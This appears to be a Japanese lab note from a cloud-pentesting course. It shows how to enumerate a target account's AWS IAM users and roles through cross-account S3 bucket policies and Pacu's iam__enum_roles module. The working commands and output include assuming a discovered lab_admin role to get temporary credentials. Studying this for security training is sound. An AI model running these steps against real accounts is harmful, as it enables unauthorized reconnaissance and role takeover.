>ターゲットのアカウントIDが分かっている前提の作業であることに注意

- クロスアカウントアクセス機能を利用してユーザを列挙する

```sh
# 自分の環境にS3バケットを作成する
aws --profile attacker s3 mb s3://offseclab-dummy-bucket-$RANDOM-$RANDOM-$RANDOM

# 作成したバケットに使うクロスアカウントアクセスを許可するポリシーを作成
cat grant-s3-bucket-read.json
# {
#     "Version": "2012-10-17",
#     "Statement": [
#         {
#             "Sid": "AllowUserToListBucket",
#             "Effect": "Allow",
#             "Resource": "arn:aws:s3:::offseclab-dummy-bucket-28967-25641-13328",
#             "Principal": {
#                 "AWS": ["arn:aws:iam::123456789012:user/cloudadmin"] <- ここでターゲットのアカウントIDと列挙したいユーザ名を指定
#             },
#             "Action": "s3:ListBucket"
# 
#         }
#     ]
# }

# バケットにポリシーを適用
# ここでエラーがでなければ、ターゲットのアカウントIDに指定したユーザが存在することが分かる
aws --profile attacker s3api put-bucket-policy --bucket offseclab-dummy-bucket-28967-25641-13328 --policy file://grant-s3-bucket-read.json
```


### 自動化
- pacuというツールを使ってユーザとロールの列挙を自動化できる（列挙に使う方法は手動手順と同じ）
```sh
# 辞書を作って
echo -n "lab_admin
security_auditor
content_creator
student_access
lab_builder
instructor
network_config
monitoring_logging
backup_restore
content_editor" > /tmp/role-names.txt

# pacuを起動して
pacu
# ....
# Database created at /root/.local/share/pacu/sqlite.db
# 
# What would you like to name this new session? offseclab
# Session offseclab created.
# ...

# aws cliのプロファイルを指定して
Pacu (offseclab:No Keys Set) > import_keys attacker
#   Imported keys as "imported-attacker"

# lsで利用可能なモジュールの一覧表示ができて
Pacu (offseclab:imported-attacker) > ls
# ...
# [Category: RECON_UNAUTH]
#
#   iam__enum_roles
#   iam__enum_users <- ユーザ列挙モジュール
# ...

# help でモジュールの使い方など確認可能
Pacu (offseclab:imported-attacker) > help iam__enum_roles
# 
# iam__enum_roles written by Spencer Gietzen of Rhino Security Labs.
# 
# usage: pacu [--word-list WORD_LIST] [--role-name ROLE_NAME] --account-id
#             ACCOUNT_ID
# 
# This module takes in a valid AWS account ID and tries to enumerate existing
# IAM roles within that account. It does so by trying to update the
# AssumeRole policy document of the role that you pass into --role-name if
# passed or newlycreated role. For your safety, it updates the policy with an
# explicit deny against the AWS account/IAM role, so that no security holes
# are opened in your account during enumeration. NOTE: It is recommended to
# use personal AWS access keys for this script, as it will spam CloudTrail
# with "iam:UpdateAssumeRolePolicy" logs and a few "sts:AssumeRole" logs. The
# target account will not see anything in their logs though, unless you find
# a misconfigured role that allows you to assume it. The keys used must have
# the iam:UpdateAssumeRolePolicy permission on the role that you pass into
# --role-name to be able to identify a valid IAM role and the sts:AssumeRole
# permission to try and request credentials for any enumerated roles.
# ...

# 使い方が分かったらrunでモジュールを実行
Pacu (offseclab:imported-attacker) > run iam__enum_roles --word-list /tmp/role-names.txt --account-id 123456789012
#   Running module iam__enum_roles...
# ...
# 
# [iam__enum_roles] Targeting account ID: 123456789012
# 
# [iam__enum_roles] Starting role enumeration...
# 
# 
# [iam__enum_roles]   Found role: arn:aws:iam::123456789012:role/lab_admin
# 
# [iam__enum_roles] Found 1 role(s):
# 
# [iam__enum_roles]     arn:aws:iam::123456789012:role/lab_admin <- ロール発見
# 
# [iam__enum_roles] Checking to see if any of these roles can be assumed for temporary credentials...
# 
# [iam__enum_roles]   Role can be assumed, but hit max session time limit, reverting to minimum of 1 hour...
# 
# [iam__enum_roles]   Successfully assumed role for 1 hour: arn:aws:iam::123456789012:role/lab_admin
# 
# [iam__enum_roles] {
#   "Credentials": {
#     "AccessKeyId": "ASIAQOM......",
#     "SecretAccessKey": "2UU80dtizqx3D....",
#     "SessionToken": "FwoGZXIvYXdzEO///////////wEaDCv5...",
#     "Expiration": "2023-08-18 22:07:49+00:00"
#   },
#   "AssumedRoleUser": {
#     "AssumedRoleId": "AROAQOMAIGYUR5KMGWT7V:dCkQ0O1y6n9KSQmGBaKJ",
#     "Arn": "arn:aws:sts::123456789012:assumed-role/lab_admin/dCkQ0O1y6n9KSQmGBaKJ"
#   }
# }
# Cleaning up the PacuIamEnumRoles-XbsIV role.

# pacuで収集したデータはpacu上で確認できる
# 別セッションで収集したデータは確認できないので注意
Pacu (enumlab:imported-target) > services
#   IAM

Pacu (enumlab:imported-target) > data IAM
# {
#   "Groups": [
#     {
#       "Arn": "arn:aws:iam::123456789012:group/admin/admin",
#       "GroupId": "AGPAQOMAIGYUZQMC6G5NM",
#       "GroupName": "admin",
#       "Path": "/admin/"
#     },
#     {
#       "Arn": "arn:aws:iam::123456789012:group/amethyst/amethyst_admin",
#       "GroupId": "AGPAQOMAIGYUYF3JD3FXV",
#       "GroupName": "amethyst_admin",
#       "Path": "/amethyst/"
#     },
# ...

# アタックパスの検索にawspxなど使える（AWS向けのbloodhoundみたいなツール）
awspx ingest
```